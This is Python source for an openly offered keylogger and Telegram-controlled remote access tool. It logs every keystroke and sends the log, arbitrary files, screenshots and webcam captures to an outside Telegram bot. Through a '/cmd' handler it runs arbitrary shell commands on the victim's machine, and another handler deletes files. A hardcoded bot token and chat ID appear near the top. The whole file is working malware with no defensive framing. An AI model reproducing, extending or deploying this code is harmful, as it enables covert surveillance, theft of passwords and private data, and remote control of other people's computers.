"""
Telegram Simple Keylogger: version: 1.0
Autor: @Desmondelite 
Description: Um simples keylogger python3 que envia as informacoes para um bot no telegram.

"""
import telepot
import logging 
import os
import pyautogui
import time
import cv2
from pprint import pprint 
from pynput.keyboard import Key, Listener

"""
pip install python-opencv
pip install pprint 
pip install pynput 
pip install logging 
pip install pyautogui
pip install telepot 

"""
#log_dir = "C:\Windows"  


bot = telepot.Bot('1167193014:AAFtnpM29Zl6hl4CmVxPXVoFSNjfGU2QGic') #api
chat_id = "915401400" 

logging.basicConfig(filename=("system.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
#part keylogger buttons

def on_press(key):
    logging.info('"{0}"'.format(key))
    

def gravar_tec(fun):
	with Listener(on_press=on_press) as listener:
	      listener.join()
	      fun #loop is here
#receive and send the files to my telegram
def receber_comando(msg):
	pprint(msg['text']) #test, if you want remove
	text = msg['text']
	if '/cmd' in text:
		cmd = text.split()
		proc = os.popen(cmd[1])

		file_command = open("comand.txt", 'w')

		for line in proc.read():
			file_command.write(line)

		file_command.close()

		with open("comand.txt", 'rb') as comandu:
			bot.sendDocument(chat_id, comandu)

		os.remove("comand.txt")
		
	if '/image' in text:
		cmd = text.split()
		filename = cmd[1]
		with open(filename, 'rb') as doc:
			bot.sendPhoto(chat_id, doc)

	if '/keylog' in text:
		with open("system.txt", 'rb') as doc:
			bot.sendDocument(chat_id, doc)

	if '/screen' in text:
		cmd = text.split()
		name_img = cmd[1]
		screenshot = pyautogui.screenshot(name_img)
		with open(name_img, 'rb') as doc:
			bot.sendPhoto(chat_id, doc)
			
	
	if '/down' in text:
		cmd = text.split()
		filename = cmd[1]
		with open(filename, 'rb') as doc:
			bot.sendDocument(chat_id, doc)

	if '/webcam' in text:
		img_name = text.split()
		img_n = img_name[1]
		camera_port = 0
		camera = cv2.VideoCapture(camera_port)
		time.sleep(0.1)  #For not capture black screen
		return_value, image = camera.read()
		cv2.imwrite(img_n, image)
		del(camera)	
		time.sleep(1)
		with open(img_n, 'rb') as doc:
			bot.sendPhoto(chat_id, doc)

	if '/clear' in text:
		file = text.split()
		ex_file = file[1]
		os.remove(ex_file) #remove files
		bot.sendMessage(chat_id, "[+] File {} has been removed!").format(ex_file)

try:
	gravar_tec(bot.message_loop(receber_comando))
finally:
	os.remove("system.txt")	
	#Going to remove this file txt 
